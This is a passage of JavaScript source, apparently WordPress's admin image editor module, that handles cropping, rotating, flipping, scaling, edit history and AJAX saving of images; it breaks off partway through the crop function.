/**
 * The functions necessary for editing images.
 *
 * @since 2.9.0
 * @output wp-admin/js/image-edit.js
 */

 /* global ajaxurl, confirm */

(function($) {
	var __ = wp.i18n.__;

	/**
	 * Contains all the methods to initialize and control the image editor.
	 *
	 * @namespace imageEdit
	 */
	var imageEdit = window.imageEdit = {
	iasapi : {},
	hold : {},
	postid : '',
	_view : false,

	/**
	 * Enable crop tool.
	 */
	toggleCropTool: function( postid, nonce, cropButton ) {
		var img = $( '#image-preview-' + postid ),
			selection = this.iasapi.getSelection();

		imageEdit.toggleControls( cropButton );
		var $el = $( cropButton );
		var state = ( $el.attr( 'aria-expanded' ) === 'true' ) ? 'true' : 'false';
		// Crop tools have been closed.
		if ( 'false' === state ) {
			// Cancel selection, but do not unset inputs.
			this.iasapi.cancelSelection();
			imageEdit.setDisabled($('.imgedit-crop-clear'), 0);
		} else {
			imageEdit.setDisabled($('.imgedit-crop-clear'), 1);
			// Get values from inputs to restore previous selection.
			var startX = ( $( '#imgedit-start-x-' + postid ).val() ) ? $('#imgedit-start-x-' + postid).val() : 0;
			var startY = ( $( '#imgedit-start-y-' + postid ).val() ) ? $('#imgedit-start-y-' + postid).val() : 0;
			var width = ( $( '#imgedit-sel-width-' + postid ).val() ) ? $('#imgedit-sel-width-' + postid).val() : img.innerWidth();
			var height = ( $( '#imgedit-sel-height-' + postid ).val() ) ? $('#imgedit-sel-height-' + postid).val() : img.innerHeight();
			// Ensure selection is available, otherwise reset to full image.
			if ( isNaN( selection.x1 ) ) {
				this.setCropSelection( postid, { 'x1': startX, 'y1': startY, 'x2': width, 'y2': height, 'width': width, 'height': height } );
				selection = this.iasapi.getSelection();
			}

			// If we don't already have a selection, select the entire image.
			if ( 0 === selection.x1 && 0 === selection.y1 && 0 === selection.x2 && 0 === selection.y2 ) {
				this.iasapi.setSelection( 0, 0, img.innerWidth(), img.innerHeight(), true );
				this.iasapi.setOptions( { show: true } );
				this.iasapi.update();
			} else {
				this.iasapi.setSelection( startX, startY, width, height, true );
				this.iasapi.setOptions( { show: true } );
				this.iasapi.update();
			}
		}
	},

	/**
	 * Handle crop tool clicks.
	 */
	handleCropToolClick: function( postid, nonce, cropButton ) {

		if ( cropButton.classList.contains( 'imgedit-crop-clear' ) ) {
			this.iasapi.cancelSelection();
			imageEdit.setDisabled($('.imgedit-crop-apply'), 0);

			$('#imgedit-sel-width-' + postid).val('');
			$('#imgedit-sel-height-' + postid).val('');
			$('#imgedit-start-x-' + postid).val('0');
			$('#imgedit-start-y-' + postid).val('0');
			$('#imgedit-selection-' + postid).val('');
		} else {
			// Otherwise, perform the crop.
			imageEdit.crop( postid, nonce , cropButton );
		}
	},

	/**
	 * Converts a value to an integer.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} f The float value that should be converted.
	 *
	 * @return {number} The integer representation from the float value.
	 */
	intval : function(f) {
		/*
		 * Bitwise OR operator: one of the obscure ways to truncate floating point figures,
		 * worth reminding JavaScript doesn't have a distinct "integer" type.
		 */
		return f | 0;
	},

	/**
	 * Adds the disabled attribute and class to a single form element or a field set.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {jQuery}         el The element that should be modified.
	 * @param {boolean|number} s  The state for the element. If set to true
	 *                            the element is disabled,
	 *                            otherwise the element is enabled.
	 *                            The function is sometimes called with a 0 or 1
	 *                            instead of true or false.
	 *
	 * @return {void}
	 */
	setDisabled : function( el, s ) {
		/*
		 * `el` can be a single form element or a fieldset. Before #28864, the disabled state on
		 * some text fields  was handled targeting $('input', el). Now we need to handle the
		 * disabled state on buttons too so we can just target `el` regardless if it's a single
		 * element or a fieldset because when a fieldset is disabled, its descendants are disabled too.
		 */
		if ( s ) {
			el.removeClass( 'disabled' ).prop( 'disabled', false );
		} else {
			el.addClass( 'disabled' ).prop( 'disabled', true );
		}
	},

	/**
	 * Initializes the image editor.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 *
	 * @return {void}
	 */
	init : function(postid) {
		var t = this, old = $('#image-editor-' + t.postid),
			x = t.intval( $('#imgedit-x-' + postid).val() ),
			y = t.intval( $('#imgedit-y-' + postid).val() );

		if ( t.postid !== postid && old.length ) {
			t.close(t.postid);
		}

		t.hold.w = t.hold.ow = x;
		t.hold.h = t.hold.oh = y;
		t.hold.xy_ratio = x / y;
		t.hold.sizer = parseFloat( $('#imgedit-sizer-' + postid).val() );
		t.postid = postid;
		$('#imgedit-response-' + postid).empty();

		$('#imgedit-panel-' + postid).on( 'keypress', function(e) {
			var nonce = $( '#imgedit-nonce-' + postid ).val();
			if ( e.which === 26 && e.ctrlKey ) {
				imageEdit.undo( postid, nonce );
			}

			if ( e.which === 25 && e.ctrlKey ) {
				imageEdit.redo( postid, nonce );
			}
		});

		$('#imgedit-panel-' + postid).on( 'keypress', 'input[type="text"]', function(e) {
			var k = e.keyCode;

			// Key codes 37 through 40 are the arrow keys.
			if ( 36 < k && k < 41 ) {
				$(this).trigger( 'blur' );
			}

			// The key code 13 is the Enter key.
			if ( 13 === k ) {
				e.preventDefault();
				e.stopPropagation();
				return false;
			}
		});

		$( document ).on( 'image-editor-ui-ready', this.focusManager );
	},

	/**
	 * Toggles the wait/load icon in the editor.
	 *
	 * @since 2.9.0
	 * @since 5.5.0 Added the triggerUIReady parameter.
	 *
	 * @memberof imageEdit
	 *
	 * @param {number}  postid         The post ID.
	 * @param {number}  toggle         Is 0 or 1, fades the icon in when 1 and out when 0.
	 * @param {boolean} triggerUIReady Whether to trigger a custom event when the UI is ready. Default false.
	 *
	 * @return {void}
	 */
	toggleEditor: function( postid, toggle, triggerUIReady ) {
		var wait = $('#imgedit-wait-' + postid);

		if ( toggle ) {
			wait.fadeIn( 'fast' );
		} else {
			wait.fadeOut( 'fast', function() {
				if ( triggerUIReady ) {
					$( document ).trigger( 'image-editor-ui-ready' );
				}
			} );
		}
	},

	/**
	 * Shows or hides image menu popup.
	 *
	 * @since 6.3.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {HTMLElement} el The activated control element.
	 *
	 * @return {boolean} Always returns false.
	 */
	togglePopup : function(el) {
		var $el = $( el );
		var $targetEl = $( el ).attr( 'aria-controls' );
		var $target = $( '#' + $targetEl );
		$el
			.attr( 'aria-expanded', 'false' === $el.attr( 'aria-expanded' ) ? 'true' : 'false' );
		// Open menu and set z-index to appear above image crop area if it is enabled.
		$target
			.toggleClass( 'imgedit-popup-menu-open' ).slideToggle( 'fast' ).css( { 'z-index' : 200000 } );
		// Move focus to first item in menu when opening menu.
		if ( 'true' === $el.attr( 'aria-expanded' ) ) {
			$target.find( 'button' ).first().trigger( 'focus' );
		}

		return false;
	},

	/**
	 * Observes whether the popup should remain open based on focus position.
	 *
	 * @since 6.4.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {HTMLElement} el The activated control element.
	 *
	 * @return {boolean} Always returns false.
	 */
	monitorPopup : function() {
		var $parent = document.querySelector( '.imgedit-rotate-menu-container' );
		var $toggle = document.querySelector( '.imgedit-rotate-menu-container .imgedit-rotate' );

		setTimeout( function() {
			var $focused = document.activeElement;
			var $contains = $parent.contains( $focused );

			// If $focused is defined and not inside the menu container, close the popup.
			if ( $focused && ! $contains ) {
				if ( 'true' === $toggle.getAttribute( 'aria-expanded' ) ) {
					imageEdit.togglePopup( $toggle );
				}
			}
		}, 100 );

		return false;
	},

	/**
	 * Navigate popup menu by arrow keys.
	 *
	 * @since 6.3.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {HTMLElement} el The current element.
	 *
	 * @return {boolean} Always returns false.
	 */
	browsePopup : function(el) {
		var $el = $( el );
		var $collection = $( el ).parent( '.imgedit-popup-menu' ).find( 'button' );
		var $index = $collection.index( $el );
		var $prev = $index - 1;
		var $next = $index + 1;
		var $last = $collection.length;
		if ( $prev < 0 ) {
			$prev = $last - 1;
		}
		if ( $next === $last ) {
			$next = 0;
		}
		var $target = false;
		if ( event.keyCode === 40 ) {
			$target = $collection.get( $next );
		} else if ( event.keyCode === 38 ) {
			$target = $collection.get( $prev );
		}
		if ( $target ) {
			$target.focus();
			event.preventDefault();
		}

		return false;
	},

	/**
	 * Close popup menu and reset focus on feature activation.
	 *
	 * @since 6.3.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {HTMLElement} el The current element.
	 *
	 * @return {boolean} Always returns false.
	 */
	closePopup : function(el) {
		var $parent = $(el).parent( '.imgedit-popup-menu' );
		var $controlledID = $parent.attr( 'id' );
		var $target = $( 'button[aria-controls="' + $controlledID + '"]' );
		$target
			.attr( 'aria-expanded', 'false' ).trigger( 'focus' );
		$parent
			.toggleClass( 'imgedit-popup-menu-open' ).slideToggle( 'fast' );

		return false;
	},

	/**
	 * Shows or hides the image edit help box.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {HTMLElement} el The element to create the help window in.
	 *
	 * @return {boolean} Always returns false.
	 */
	toggleHelp : function(el) {
		var $el = $( el );
		$el
			.attr( 'aria-expanded', 'false' === $el.attr( 'aria-expanded' ) ? 'true' : 'false' )
			.parents( '.imgedit-group-top' ).toggleClass( 'imgedit-help-toggled' ).find( '.imgedit-help' ).slideToggle( 'fast' );

		return false;
	},

	/**
	 * Shows or hides image edit input fields when enabled.
	 *
	 * @since 6.3.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {HTMLElement} el The element to trigger the edit panel.
	 *
	 * @return {boolean} Always returns false.
	 */
	toggleControls : function(el) {
		var $el = $( el );
		var $target = $( '#' + $el.attr( 'aria-controls' ) );
		$el
			.attr( 'aria-expanded', 'false' === $el.attr( 'aria-expanded' ) ? 'true' : 'false' );
		$target
			.parent( '.imgedit-group' ).toggleClass( 'imgedit-panel-active' );

		return false;
	},

	/**
	 * Gets the value from the image edit target.
	 *
	 * The image edit target contains the image sizes where the (possible) changes
	 * have to be applied to.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 *
	 * @return {string} The value from the imagedit-save-target input field when available,
	 *                  'full' when not selected, or 'all' if it doesn't exist.
	 */
	getTarget : function( postid ) {
		var element = $( '#imgedit-save-target-' + postid );

		if ( element.length ) {
			return element.find( 'input[name="imgedit-target-' + postid + '"]:checked' ).val() || 'full';
		}

		return 'all';
	},

	/**
	 * Recalculates the height or width and keeps the original aspect ratio.
	 *
	 * If the original image size is exceeded a red exclamation mark is shown.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number}         postid The current post ID.
	 * @param {number}         x      Is 0 when it applies the y-axis
	 *                                and 1 when applicable for the x-axis.
	 * @param {jQuery}         el     Element.
	 *
	 * @return {void}
	 */
	scaleChanged : function( postid, x, el ) {
		var w = $('#imgedit-scale-width-' + postid), h = $('#imgedit-scale-height-' + postid),
		warn = $('#imgedit-scale-warn-' + postid), w1 = '', h1 = '',
		scaleBtn = $('#imgedit-scale-button');

		if ( false === this.validateNumeric( el ) ) {
			return;
		}

		if ( x ) {
			h1 = ( w.val() !== '' ) ? Math.round( w.val() / this.hold.xy_ratio ) : '';
			h.val( h1 );
		} else {
			w1 = ( h.val() !== '' ) ? Math.round( h.val() * this.hold.xy_ratio ) : '';
			w.val( w1 );
		}

		if ( ( h1 && h1 > this.hold.oh ) || ( w1 && w1 > this.hold.ow ) ) {
			warn.css('visibility', 'visible');
			scaleBtn.prop('disabled', true);
		} else {
			warn.css('visibility', 'hidden');
			scaleBtn.prop('disabled', false);
		}
	},

	/**
	 * Gets the selected aspect ratio.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 *
	 * @return {string} The aspect ratio.
	 */
	getSelRatio : function(postid) {
		var x = this.hold.w, y = this.hold.h,
			X = this.intval( $('#imgedit-crop-width-' + postid).val() ),
			Y = this.intval( $('#imgedit-crop-height-' + postid).val() );

		if ( X && Y ) {
			return X + ':' + Y;
		}

		if ( x && y ) {
			return x + ':' + y;
		}

		return '1:1';
	},

	/**
	 * Removes the last action from the image edit history.
	 * The history consist of (edit) actions performed on the image.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid  The post ID.
	 * @param {number} setSize 0 or 1, when 1 the image resets to its original size.
	 *
	 * @return {string} JSON string containing the history or an empty string if no history exists.
	 */
	filterHistory : function(postid, setSize) {
		// Apply undo state to history.
		var history = $('#imgedit-history-' + postid).val(), pop, n, o, i, op = [];

		if ( history !== '' ) {
			// Read the JSON string with the image edit history.
			history = JSON.parse(history);
			pop = this.intval( $('#imgedit-undone-' + postid).val() );
			if ( pop > 0 ) {
				while ( pop > 0 ) {
					history.pop();
					pop--;
				}
			}

			// Reset size to its original state.
			if ( setSize ) {
				if ( !history.length ) {
					this.hold.w = this.hold.ow;
					this.hold.h = this.hold.oh;
					return '';
				}

				// Restore original 'o'.
				o = history[history.length - 1];

				// c = 'crop', r = 'rotate', f = 'flip'.
				o = o.c || o.r || o.f || false;

				if ( o ) {
					// fw = Full image width.
					this.hold.w = o.fw;
					// fh = Full image height.
					this.hold.h = o.fh;
				}
			}

			// Filter the last step/action from the history.
			for ( n in history ) {
				i = history[n];
				if ( i.hasOwnProperty('c') ) {
					op[n] = { 'c': { 'x': i.c.x, 'y': i.c.y, 'w': i.c.w, 'h': i.c.h } };
				} else if ( i.hasOwnProperty('r') ) {
					op[n] = { 'r': i.r.r };
				} else if ( i.hasOwnProperty('f') ) {
					op[n] = { 'f': i.f.f };
				}
			}
			return JSON.stringify(op);
		}
		return '';
	},
	/**
	 * Binds the necessary events to the image.
	 *
	 * When the image source is reloaded the image will be reloaded.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number}   postid   The post ID.
	 * @param {string}   nonce    The nonce to verify the request.
	 * @param {function} callback Function to execute when the image is loaded.
	 *
	 * @return {void}
	 */
	refreshEditor : function(postid, nonce, callback) {
		var t = this, data, img;

		t.toggleEditor(postid, 1);
		data = {
			'action': 'imgedit-preview',
			'_ajax_nonce': nonce,
			'postid': postid,
			'history': t.filterHistory(postid, 1),
			'rand': t.intval(Math.random() * 1000000)
		};

		img = $( '<img id="image-preview-' + postid + '" alt="" />' )
			.on( 'load', { history: data.history }, function( event ) {
				var max1, max2,
					parent = $( '#imgedit-crop-' + postid ),
					t = imageEdit,
					historyObj;

				// Checks if there already is some image-edit history.
				if ( '' !== event.data.history ) {
					historyObj = JSON.parse( event.data.history );
					// If last executed action in history is a crop action.
					if ( historyObj[historyObj.length - 1].hasOwnProperty( 'c' ) ) {
						/*
						 * A crop action has completed and the crop button gets disabled
						 * ensure the undo button is enabled.
						 */
						t.setDisabled( $( '#image-undo-' + postid) , true );
						// Move focus to the undo button to avoid a focus loss.
						$( '#image-undo-' + postid ).trigger( 'focus' );
					}
				}

				parent.empty().append(img);

				// w, h are the new full size dimensions.
				max1 = Math.max( t.hold.w, t.hold.h );
				max2 = Math.max( $(img).width(), $(img).height() );
				t.hold.sizer = max1 > max2 ? max2 / max1 : 1;

				t.initCrop(postid, img, parent);

				if ( (typeof callback !== 'undefined') && callback !== null ) {
					callback();
				}

				if ( $('#imgedit-history-' + postid).val() && $('#imgedit-undone-' + postid).val() === '0' ) {
					$('button.imgedit-submit-btn', '#imgedit-panel-' + postid).prop('disabled', false);
				} else {
					$('button.imgedit-submit-btn', '#imgedit-panel-' + postid).prop('disabled', true);
				}
				var successMessage = __( 'Image updated.' );

				t.toggleEditor(postid, 0);
				wp.a11y.speak( successMessage, 'assertive' );
			})
			.on( 'error', function() {
				var errorMessage = __( 'Could not load the preview image. Please reload the page and try again.' );

				$( '#imgedit-crop-' + postid )
					.empty()
					.append( '<div class="notice notice-error" tabindex="-1" role="alert"><p>' + errorMessage + '</p></div>' );

				t.toggleEditor( postid, 0, true );
				wp.a11y.speak( errorMessage, 'assertive' );
			} )
			.attr('src', ajaxurl + '?' + $.param(data));
	},
	/**
	 * Performs an image edit action.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce to verify the request.
	 * @param {string} action The action to perform on the image.
	 *                        The possible actions are: "scale" and "restore".
	 *
	 * @return {boolean|void} Executes a post request that refreshes the page
	 *                        when the action is performed.
	 *                        Returns false if an invalid action is given,
	 *                        or when the action cannot be performed.
	 */
	action : function(postid, nonce, action) {
		var t = this, data, w, h, fw, fh;

		if ( t.notsaved(postid) ) {
			return false;
		}

		data = {
			'action': 'image-editor',
			'_ajax_nonce': nonce,
			'postid': postid
		};

		if ( 'scale' === action ) {
			w = $('#imgedit-scale-width-' + postid),
			h = $('#imgedit-scale-height-' + postid),
			fw = t.intval(w.val()),
			fh = t.intval(h.val());

			if ( fw < 1 ) {
				w.trigger( 'focus' );
				return false;
			} else if ( fh < 1 ) {
				h.trigger( 'focus' );
				return false;
			}

			if ( fw === t.hold.ow || fh === t.hold.oh ) {
				return false;
			}

			data['do'] = 'scale';
			data.fwidth = fw;
			data.fheight = fh;
		} else if ( 'restore' === action ) {
			data['do'] = 'restore';
		} else {
			return false;
		}

		t.toggleEditor(postid, 1);
		$.post( ajaxurl, data, function( response ) {
			$( '#image-editor-' + postid ).empty().append( response.data.html );
			t.toggleEditor( postid, 0, true );
			// Refresh the attachment model so that changes propagate.
			if ( t._view ) {
				t._view.refresh();
			}
		} ).done( function( response ) {
			// Whether the executed action was `scale` or `restore`, the response does have a message.
			if ( response && response.data.message.msg ) {
				wp.a11y.speak( response.data.message.msg );
				return;
			}

			if ( response && response.data.message.error ) {
				wp.a11y.speak( response.data.message.error );
			}
		} );
	},

	/**
	 * Stores the changes that are made to the image.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number}  postid   The post ID to get the image from the database.
	 * @param {string}  nonce    The nonce to verify the request.
	 *
	 * @return {boolean|void}  If the actions are successfully saved a response message is shown.
	 *                         Returns false if there is no image editing history,
	 *                         thus there are not edit-actions performed on the image.
	 */
	save : function(postid, nonce) {
		var data,
			target = this.getTarget(postid),
			history = this.filterHistory(postid, 0),
			self = this;

		if ( '' === history ) {
			return false;
		}

		this.toggleEditor(postid, 1);
		data = {
			'action': 'image-editor',
			'_ajax_nonce': nonce,
			'postid': postid,
			'history': history,
			'target': target,
			'context': $('#image-edit-context').length ? $('#image-edit-context').val() : null,
			'do': 'save'
		};
		// Post the image edit data to the backend.
		$.post( ajaxurl, data, function( response ) {
			// If a response is returned, close the editor and show an error.
			if ( response.data.error ) {
				$( '#imgedit-response-' + postid )
					.html( '<div class="notice notice-error" tabindex="-1" role="alert"><p>' + response.data.error + '</p></div>' );

				imageEdit.close(postid);
				wp.a11y.speak( response.data.error );
				return;
			}

			if ( response.data.fw && response.data.fh ) {
				$( '#media-dims-' + postid ).html( response.data.fw + ' &times; ' + response.data.fh );
			}

			if ( response.data.thumbnail ) {
				$( '.thumbnail', '#thumbnail-head-' + postid ).attr( 'src', '' + response.data.thumbnail );
			}

			if ( response.data.msg ) {
				$( '#imgedit-response-' + postid )
					.html( '<div class="notice notice-success" tabindex="-1" role="alert"><p>' + response.data.msg + '</p></div>' );

				wp.a11y.speak( response.data.msg );
			}

			if ( self._view ) {
				self._view.save();
			} else {
				imageEdit.close(postid);
			}
		});
	},

	/**
	 * Creates the image edit window.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid   The post ID for the image.
	 * @param {string} nonce    The nonce to verify the request.
	 * @param {Object} view     The image editor view to be used for the editing.
	 *
	 * @return {void|promise} Either returns void if the button was already activated
	 *                        or returns an instance of the image editor, wrapped in a promise.
	 */
	open : function( postid, nonce, view ) {
		this._view = view;

		var dfd, data,
			elem = $( '#image-editor-' + postid ),
			head = $( '#media-head-' + postid ),
			btn = $( '#imgedit-open-btn-' + postid ),
			spin = btn.siblings( '.spinner' );

		/*
		 * Instead of disabling the button, which causes a focus loss and makes screen
		 * readers announce "unavailable", return if the button was already clicked.
		 */
		if ( btn.hasClass( 'button-activated' ) ) {
			return;
		}

		spin.addClass( 'is-active' );

		data = {
			'action': 'image-editor',
			'_ajax_nonce': nonce,
			'postid': postid,
			'do': 'open'
		};

		dfd = $.ajax( {
			url:  ajaxurl,
			type: 'post',
			data: data,
			beforeSend: function() {
				btn.addClass( 'button-activated' );
			}
		} ).done( function( response ) {
			var errorMessage;

			if ( '-1' === response ) {
				errorMessage = __( 'Could not load the preview image.' );
				elem.html( '<div class="notice notice-error" tabindex="-1" role="alert"><p>' + errorMessage + '</p></div>' );
			}

			if ( response.data && response.data.html ) {
				elem.html( response.data.html );
			}

			head.fadeOut( 'fast', function() {
				elem.fadeIn( 'fast', function() {
					if ( errorMessage ) {
						$( document ).trigger( 'image-editor-ui-ready' );
					}
				} );
				btn.removeClass( 'button-activated' );
				spin.removeClass( 'is-active' );
			} );
			// Initialize the Image Editor now that everything is ready.
			imageEdit.init( postid );
		} );

		return dfd;
	},

	/**
	 * Initializes the cropping tool and sets a default cropping selection.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 *
	 * @return {void}
	 */
	imgLoaded : function(postid) {
		var img = $('#image-preview-' + postid), parent = $('#imgedit-crop-' + postid);

		// Ensure init has run even when directly loaded.
		if ( 'undefined' === typeof this.hold.sizer ) {
			this.init( postid );
		}

		this.initCrop(postid, img, parent);
		this.setCropSelection( postid, { 'x1': 0, 'y1': 0, 'x2': 0, 'y2': 0, 'width': img.innerWidth(), 'height': img.innerHeight() } );

		this.toggleEditor( postid, 0, true );
	},

	/**
	 * Manages keyboard focus in the Image Editor user interface.
	 *
	 * @since 5.5.0
	 *
	 * @return {void}
	 */
	focusManager: function() {
		/*
		 * Editor is ready. Move focus to one of the admin alert notices displayed
		 * after a user action or to the first focusable element. Since the DOM
		 * update is pretty large, the timeout helps browsers update their
		 * accessibility tree to better support assistive technologies.
		 */
		setTimeout( function() {
			var elementToSetFocusTo = $( '.notice[role="alert"]' );

			if ( ! elementToSetFocusTo.length ) {
				elementToSetFocusTo = $( '.imgedit-wrap' ).find( ':tabbable:first' );
			}

			elementToSetFocusTo.attr( 'tabindex', '-1' ).trigger( 'focus' );
		}, 100 );
	},

	/**
	 * Initializes the cropping tool.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number}      postid The post ID.
	 * @param {HTMLElement} image  The preview image.
	 * @param {HTMLElement} parent The preview image container.
	 *
	 * @return {void}
	 */
	initCrop : function(postid, image, parent) {
		var t = this,
			selW = $('#imgedit-sel-width-' + postid),
			selH = $('#imgedit-sel-height-' + postid),
			selX = $('#imgedit-start-x-' + postid),
			selY = $('#imgedit-start-y-' + postid),
			$image = $( image ),
			$img;

		// Already initialized?
		if ( $image.data( 'imgAreaSelect' ) ) {
			return;
		}

		t.iasapi = $image.imgAreaSelect({
			parent: parent,
			instance: true,
			handles: true,
			keys: true,
			minWidth: 3,
			minHeight: 3,

			/**
			 * Sets the CSS styles and binds events for locking the aspect ratio.
			 *
			 * @ignore
			 *
			 * @param {jQuery} img The preview image.
			 */
			onInit: function( img ) {
				// Ensure that the imgAreaSelect wrapper elements are position:absolute
				// (even if we're in a position:fixed modal).
				$img = $( img );
				$img.next().css( 'position', 'absolute' )
					.nextAll( '.imgareaselect-outer' ).css( 'position', 'absolute' );
				/**
				 * Binds mouse down event to the cropping container.
				 *
				 * @return {void}
				 */
				parent.children().on( 'mousedown, touchstart', function(e){
					var ratio = false, sel, defRatio;

					if ( e.shiftKey ) {
						sel = t.iasapi.getSelection();
						defRatio = t.getSelRatio(postid);
						ratio = ( sel && sel.width && sel.height ) ? sel.width + ':' + sel.height : defRatio;
					}

					t.iasapi.setOptions({
						aspectRatio: ratio
					});
				});
			},

			/**
			 * Event triggered when starting a selection.
			 *
			 * @ignore
			 *
			 * @return {void}
			 */
			onSelectStart: function() {
				imageEdit.setDisabled($('#imgedit-crop-sel-' + postid), 1);
				imageEdit.setDisabled($('.imgedit-crop-clear'), 1);
				imageEdit.setDisabled($('.imgedit-crop-apply'), 1);
			},
			/**
			 * Event triggered when the selection is ended.
			 *
			 * @ignore
			 *
			 * @param {Object} img jQuery object representing the image.
			 * @param {Object} c   The selection.
			 *
			 * @return {Object}
			 */
			onSelectEnd: function(img, c) {
				imageEdit.setCropSelection(postid, c);
				if ( ! $('#imgedit-crop > *').is(':visible') ) {
					imageEdit.toggleControls($('.imgedit-crop.button'));
				}
			},

			/**
			 * Event triggered when the selection changes.
			 *
			 * @ignore
			 *
			 * @param {Object} img jQuery object representing the image.
			 * @param {Object} c   The selection.
			 *
			 * @return {void}
			 */
			onSelectChange: function(img, c) {
				var sizer = imageEdit.hold.sizer;
				selW.val( imageEdit.round(c.width / sizer) );
				selH.val( imageEdit.round(c.height / sizer) );
				selX.val( imageEdit.round(c.x1 / sizer) );
				selY.val( imageEdit.round(c.y1 / sizer) );
			}
		});
	},

	/**
	 * Stores the current crop selection.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {Object} c      The selection.
	 *
	 * @return {boolean}
	 */
	setCropSelection : function(postid, c) {
		var sel;

		c = c || 0;

		if ( !c || ( c.width < 3 && c.height < 3 ) ) {
			this.setDisabled( $( '.imgedit-crop', '#imgedit-panel-' + postid ), 1 );
			this.setDisabled( $( '#imgedit-crop-sel-' + postid ), 1 );
			$('#imgedit-sel-width-' + postid).val('');
			$('#imgedit-sel-height-' + postid).val('');
			$('#imgedit-start-x-' + postid).val('0');
			$('#imgedit-start-y-' + postid).val('0');
			$('#imgedit-selection-' + postid).val('');
			return false;
		}

		sel = { 'x': c.x1, 'y': c.y1, 'w': c.width, 'h': c.height };
		this.setDisabled($('.imgedit-crop', '#imgedit-panel-' + postid), 1);
		$('#imgedit-selection-' + postid).val( JSON.stringify(sel) );
	},


	/**
	 * Closes the image editor.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number}  postid The post ID.
	 * @param {boolean} warn   Warning message.
	 *
	 * @return {void|boolean} Returns false if there is a warning.
	 */
	close : function(postid, warn) {
		warn = warn || false;

		if ( warn && this.notsaved(postid) ) {
			return false;
		}

		this.iasapi = {};
		this.hold = {};

		// If we've loaded the editor in the context of a Media Modal,
		// then switch to the previous view, whatever that might have been.
		if ( this._view ){
			this._view.back();
		}

		// In case we are not accessing the image editor in the context of a View,
		// close the editor the old-school way.
		else {
			$('#image-editor-' + postid).fadeOut('fast', function() {
				$( '#media-head-' + postid ).fadeIn( 'fast', function() {
					// Move focus back to the Edit Image button. Runs also when saving.
					$( '#imgedit-open-btn-' + postid ).trigger( 'focus' );
				});
				$(this).empty();
			});
		}


	},

	/**
	 * Checks if the image edit history is saved.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 *
	 * @return {boolean} Returns true if the history is not saved.
	 */
	notsaved : function(postid) {
		var h = $('#imgedit-history-' + postid).val(),
			history = ( h !== '' ) ? JSON.parse(h) : [],
			pop = this.intval( $('#imgedit-undone-' + postid).val() );

		if ( pop < history.length ) {
			if ( confirm( $('#imgedit-leaving-' + postid).text() ) ) {
				return false;
			}
			return true;
		}
		return false;
	},

	/**
	 * Adds an image edit action to the history.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {Object} op     The original position.
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce.
	 *
	 * @return {void}
	 */
	addStep : function(op, postid, nonce) {
		var t = this, elem = $('#imgedit-history-' + postid),
			history = ( elem.val() !== '' ) ? JSON.parse( elem.val() ) : [],
			undone = $( '#imgedit-undone-' + postid ),
			pop = t.intval( undone.val() );

		while ( pop > 0 ) {
			history.pop();
			pop--;
		}
		undone.val(0); // Reset.

		history.push(op);
		elem.val( JSON.stringify(history) );

		t.refreshEditor(postid, nonce, function() {
			t.setDisabled($('#image-undo-' + postid), true);
			t.setDisabled($('#image-redo-' + postid), false);
		});
	},

	/**
	 * Rotates the image.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {string} angle  The angle the image is rotated with.
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce.
	 * @param {Object} t      The target element.
	 *
	 * @return {boolean}
	 */
	rotate : function(angle, postid, nonce, t) {
		if ( $(t).hasClass('disabled') ) {
			return false;
		}
		this.closePopup(t);
		this.addStep({ 'r': { 'r': angle, 'fw': this.hold.h, 'fh': this.hold.w }}, postid, nonce);
	},

	/**
	 * Flips the image.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} axis   The axle the image is flipped on.
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce.
	 * @param {Object} t      The target element.
	 *
	 * @return {boolean}
	 */
	flip : function (axis, postid, nonce, t) {
		if ( $(t).hasClass('disabled') ) {
			return false;
		}
		this.closePopup(t);
		this.addStep({ 'f': { 'f': axis, 'fw': this.hold.w, 'fh': this.hold.h }}, postid, nonce);
	},

	/**
	 * Crops the image.
	 *
	 * @since 2.9.0
	 *
	 * @memberof imageEdit
	 *
	 * @param {number} postid The post ID.
	 * @param {string} nonce  The nonce.
	 * @param {Object} t      The target object.
	 *
	 * @return {void|boolean} Returns false if the crop button is disabled.
	 */
	crop : function (postid, nonce, t) {
		var sel = $('#imgedit-selection-' + postid).val(),
			w = this.intval( $('#imgedit-sel-width-' + postid).val() ),
			h = this.intval( $('#imgedit-sel-height-' + postid).val() );

		if ( $(t).hasClass('disabled') || sel === '' ) {
			return false;
		}

